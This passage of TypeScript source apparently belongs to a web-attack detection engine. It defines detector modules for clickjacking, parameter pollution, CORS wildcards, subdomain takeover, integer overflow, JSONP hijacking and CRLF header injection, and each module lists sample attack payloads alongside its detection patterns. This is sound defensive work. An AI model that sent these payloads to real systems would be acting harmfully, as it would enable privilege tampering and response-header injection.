    calibration: { baseConfidence: 0.73 },
    mitre: ['T1185'],
    cwe: 'CWE-1021',
    knownPayloads: [
        'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 1234\r\n\r\n',
        'content-type: text/html\ncontent-length: 500',
        'content-type: text/html\r\nserver: nginx\r\n',
    ],
    knownBenign: [
        'X-Frame-Options: DENY',
        'X-Frame-Options: SAMEORIGIN',
        'content-security-policy: frame-ancestors none',
        'HTTP/1.1 200 OK\r\nX-Frame-Options: DENY',
    ],
    detect: (input: string): boolean => {
        const decoded = deepDecode(input)
        const isHtmlResponse = RESPONSE_HEADER_CONTENT_TYPE_RE.test(decoded) && RESPONSE_HEADER_HTML_RE.test(decoded)
        return isHtmlResponse && !X_FRAME_OPTIONS_RE.test(decoded) && !FRAME_ANCESTORS_RE.test(decoded)
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        const decoded = deepDecode(input)
        const isHtmlResponse = RESPONSE_HEADER_CONTENT_TYPE_RE.test(decoded) && RESPONSE_HEADER_HTML_RE.test(decoded)
        if (!isHtmlResponse || X_FRAME_OPTIONS_RE.test(decoded) || FRAME_ANCESTORS_RE.test(decoded)) return null
        return {
            detected: true,
            confidence: 0.82,
            explanation: 'L2 framing-protection analysis found HTML response metadata without X-Frame-Options or frame-ancestors controls',
            evidence: decoded.slice(0, 160),
        }
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 1234\r\n\r\n',
            'content-type: text/html\ncontent-length: 500',
            'Content-Type: text/html\r\nServer: nginx',
            'content-type: text/html',
        ]
        return variants.slice(0, count)
    },
}

export const httpParameterPollution: InvariantClassModule = {
    id: 'http_parameter_pollution',
    description: 'HTTP parameter pollution via duplicate query parameters to bypass WAF or logic',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.78 },
    mitre: ['T1190'],
    cwe: 'CWE-20',
    knownPayloads: [
        '?id=1&id=2',
        '?role=user&role=admin',
        '?action=view&action=delete',
        '?user=alice&user=bob&admin=true',
    ],
    knownBenign: [
        '?page=1&limit=20',
        '?id=1&sort=asc',
        '?q=hello&lang=en',
    ],
    detect: (input: string): boolean => {
        const decoded = deepDecode(input)
        const seen = new Map<string, number>()
        const matches = decoded.matchAll(DUPLICATE_QUERY_PARAM_RE)
        for (const match of matches) {
            const key = match[1].toLowerCase()
            const next = (seen.get(key) ?? 0) + 1
            if (next >= 2) return true
            seen.set(key, next)
        }
        return false
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        const decoded = deepDecode(input)
        const seen = new Map<string, number>()
        const matches = decoded.matchAll(DUPLICATE_QUERY_PARAM_RE)
        for (const match of matches) {
            const key = match[1].toLowerCase()
            const next = (seen.get(key) ?? 0) + 1
            seen.set(key, next)
            if (next >= 2) {
                return {
                    detected: true,
                    confidence: 0.83,
                    explanation: 'L2 query analysis found duplicate parameter keys that can alter downstream parsing semantics',
                    evidence: key,
                }
            }
        }
        return null
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            '?id=1&id=2',
            '?role=user&role=admin',
            '?action=view&action=delete',
            '?user=alice&user=bob&admin=true',
        ]
        return variants.slice(0, count)
    },
}

export const insecureCorsWildcard: InvariantClassModule = {
    id: 'insecure_cors_wildcard',
    description: 'CORS wildcard origin allowing any domain to read credentialed responses',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.85 },
    mitre: ['T1190'],
    cwe: 'CWE-942',
    knownPayloads: [
        'Access-Control-Allow-Origin: *\r\nAccess-Control-Allow-Credentials: true',
        'access-control-allow-origin: *\naccess-control-allow-credentials: true',
        'ACAO: *\nACAC: true',
    ],
    knownBenign: [
        'Access-Control-Allow-Origin: https://trusted.com',
        'Access-Control-Allow-Origin: *\r\nContent-Type: application/json',
        'Access-Control-Allow-Origin: null',
    ],
    detect: (input: string): boolean => {
        const decoded = deepDecode(input)
        return CORS_WILDCARD_RE.test(decoded) && CORS_CREDENTIALS_RE.test(decoded)
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        const decoded = deepDecode(input)
        if (!CORS_WILDCARD_RE.test(decoded) || !CORS_CREDENTIALS_RE.test(decoded)) return null
        return {
            detected: true,
            confidence: 0.9,
            explanation: 'L2 CORS policy analysis found wildcard origin combined with credential allowance',
            evidence: decoded.slice(0, 160),
        }
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'Access-Control-Allow-Origin: *\r\nAccess-Control-Allow-Credentials: true',
            'access-control-allow-origin: *\naccess-control-allow-credentials: true',
            'ACAO: *\nACAC: true',
            'access-control-allow-credentials: true\nacao: *',
        ]
        return variants.slice(0, count)
    },
}

export const subdomainTakeoverIndicator: InvariantClassModule = {
    id: 'subdomain_takeover_indicator',
    description: 'DNS CNAME pointing to an unclaimed third-party service (subdomain takeover)',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.82 },
    mitre: ['T1584'],
    cwe: 'CWE-291',
    knownPayloads: [
        'staging.company.com CNAME abandoned-app.github.io',
        'cdn.company.com CNAME company.s3.amazonaws.com (NoSuchBucket)',
        'api.company.com CNAME app.herokuapp.com (No such app)',
        'blog.company.com CNAME company.tumblr.com (Not Found)',
    ],
    knownBenign: [
        'www.example.com CNAME cdn.cloudflare.com',
        'api.example.com A 1.2.3.4',
        'mail.example.com MX 10 mail.provider.com',
    ],
    detect: (input: string): boolean => {
        const decoded = deepDecode(input)
        const hasProviderCname = SUBDOMAIN_CNAME_PROVIDER_RE.test(decoded)
        const hasErrorIndicator = SUBDOMAIN_TAKEOVER_ERROR_RE.test(decoded)
        const pointsToGithubPages = /CNAME\s+[^\s]+\.github\.io/i.test(decoded)
        return hasProviderCname && (hasErrorIndicator || pointsToGithubPages)
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        const decoded = deepDecode(input)
        const hasProviderCname = SUBDOMAIN_CNAME_PROVIDER_RE.test(decoded)
        const hasErrorIndicator = SUBDOMAIN_TAKEOVER_ERROR_RE.test(decoded)
        const pointsToGithubPages = /CNAME\s+[^\s]+\.github\.io/i.test(decoded)
        if (!hasProviderCname || (!hasErrorIndicator && !pointsToGithubPages)) return null
        return {
            detected: true,
            confidence: 0.86,
            explanation: 'L2 DNS/content analysis found takeover-prone CNAME target with provider-specific unclaimed-service error text',
            evidence: decoded.slice(0, 160),
        }
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'cdn.company.com CNAME company.s3.amazonaws.com (NoSuchBucket)',
            'api.company.com CNAME app.herokuapp.com (No such app)',
            'blog.company.com CNAME company.tumblr.com (Not Found)',
            'edge.company.com CNAME demo.azurewebsites.net 404',
        ]
        return variants.slice(0, count)
    },
}

export const integerOverflowParam: InvariantClassModule = {
    id: 'integer_overflow_param',
    description: 'Integer overflow attempt via extreme numeric values in request parameters',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.75 },
    mitre: ['T1499'],
    cwe: 'CWE-190',
    knownPayloads: [
        '?quantity=9999999999999999999',
        '?price=-1&item=gold',
        '?age=2147483648',
        '?count=99999999999999999999&page=1',
        '?amount=-9999',
    ],
    knownBenign: [
        '?page=1&limit=20',
        '?quantity=5&item=shirt',
        '?count=100',
    ],
    detect: (input: string): boolean => {
        const decoded = deepDecode(input)
        if (NEGATIVE_NUMERIC_PARAM_RE.test(decoded)) return true
        const matches = decoded.matchAll(LARGE_NUMERIC_PARAM_RE)
        for (const match of matches) {
            const value = Number.parseInt(match[1], 10)
            if (Number.isFinite(value) && value >= 2147483648) return true
        }
        return false
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        const decoded = deepDecode(input)
        const negative = decoded.match(NEGATIVE_NUMERIC_PARAM_RE)
        if (negative) {
            return {
                detected: true,
                confidence: 0.8,
                explanation: 'L2 numeric-range analysis found negative value in parameter expected to be non-negative',
                evidence: negative[0],
            }
        }
        const matches = decoded.matchAll(LARGE_NUMERIC_PARAM_RE)
        for (const match of matches) {
            const value = Number.parseInt(match[1], 10)
            if (Number.isFinite(value) && value >= 2147483648) {
                return {
                    detected: true,
                    confidence: 0.8,
                    explanation: 'L2 numeric-range analysis found parameter value at or above 32-bit signed integer limit',
                    evidence: match[0],
                }
            }
        }
        return null
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            '?quantity=9999999999999999999',
            '?price=-1&item=gold',
            '?age=2147483648',
            '?amount=-9999',
        ]
        return variants.slice(0, count)
    },
}

export const jsonpHijacking: InvariantClassModule = {
    id: 'jsonp_hijacking',
    description: 'JSONP callback parameter enabling cross-origin data theft',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.8 },
    mitre: ['T1059.007'],
    cwe: 'CWE-346',
    knownPayloads: [
        '?callback=steal&user=me',
        '?jsonp=evilFunc&data=sensitive',
        '?cb=document.write&page=1',
        '?callback=alert&token=abc',
        '/api/users?format=jsonp&callback=hack',
    ],
    knownBenign: [
        '?callback=handleResponse',
        '?format=json&page=1',
        '?cb=myApp.onData (properly validated)',
    ],
    detect: (input: string): boolean => {
        const decoded = deepDecode(input)
        const match = decoded.match(JSONP_CALLBACK_PARAM_RE)
        if (!match) return false
        const callbackValue = match[1]
        const hasInvalidChars = !JSONP_ALLOWED_CALLBACK_CHARS_RE.test(callbackValue)
        const isTooLong = callbackValue.length > 40
        const hasDangerousSymbol = JSONP_UNSAFE_CALLBACK_RE.test(callbackValue)
        const formatJsonpPresent = /[?&]format\s*=\s*jsonp\b/i.test(decoded)
        return hasInvalidChars || isTooLong || hasDangerousSymbol || formatJsonpPresent
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        const decoded = deepDecode(input)
        const match = decoded.match(JSONP_CALLBACK_PARAM_RE)
        if (!match) return null
        const callbackValue = match[1]
        const hasInvalidChars = !JSONP_ALLOWED_CALLBACK_CHARS_RE.test(callbackValue)
        const isTooLong = callbackValue.length > 40
        const hasDangerousSymbol = JSONP_UNSAFE_CALLBACK_RE.test(callbackValue)
        const formatJsonpPresent = /[?&]format\s*=\s*jsonp\b/i.test(decoded)
        if (!hasInvalidChars && !isTooLong && !hasDangerousSymbol && !formatJsonpPresent) return null
        return {
            detected: true,
            confidence: 0.84,
            explanation: 'L2 callback analysis found JSONP callback input with suspicious execution-oriented characteristics',
            evidence: callbackValue.slice(0, 160),
        }
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            '?callback=steal&user=me',
            '?jsonp=evilFunc&data=sensitive',
            '?cb=document.write&page=1',
            '/api/users?format=jsonp&callback=hack',
        ]
        return variants.slice(0, count)
    },
}

export const responseHeaderInjection: InvariantClassModule = {
    id: 'response_header_injection',
    description: 'HTTP response header injection via CRLF in user-controlled header values',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.88 },
    mitre: ['T1190'],
    cwe: 'CWE-113',
    knownPayloads: [
        'Location: https://example.com/%0d%0aSet-Cookie: injected=true',
        'value%0AX-Injected: header',
        'text%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html',
    ],
    knownBenign: [
        'Location: https://example.com/page',
        'Set-Cookie: session=abc; HttpOnly',
        'Content-Type: application/json',
    ],
    detect: (input: string): boolean => RESPONSE_HEADER_INJECTION_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, RESPONSE_HEADER_INJECTION_RE, 'L2 CRLF analysis matched header-like content injected after newline/control-separator sequence'),
    generateVariants: (count: number): string[] => {
        const variants = [
            'Location: https://example.com/%0d%0aSet-Cookie: injected=true',
            'value%0AX-Injected: header',
            'text%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html',
            'foo\\r\\nX-Evil: yes',
        ]
        return variants.slice(0, count)
    },
}

export const HYGIENE_CLASSES: InvariantClassModule[] = [
    secretAwsKey,
    secretGithubToken,
    secretPrivateKey,
    secretStripeKey,
    infoDisclosureServerBanner,
    infoDisclosureInternalIp,
    openRedirectHeaderInjection,
    couponAbuseIndicator,
    pathDisclosureWindows,
    xmlExternalEntityParameter,
    fileUploadPolyglot,
    rateLimitBypassHeader,
]

HYGIENE_CLASSES.push(
    responseHeaderCspMissing,
    hstsMissing,
    secretInRequest,
    infoDisclosureStackTrace,
    gitExposure,
    debugParameterAbuse,
    csrfMissingToken,
    clickjackingMissingHeader,
    httpParameterPollution,
    insecureCorsWildcard,
    subdomainTakeoverIndicator,
    integerOverflowParam,
    jsonpHijacking,
    responseHeaderInjection,
)
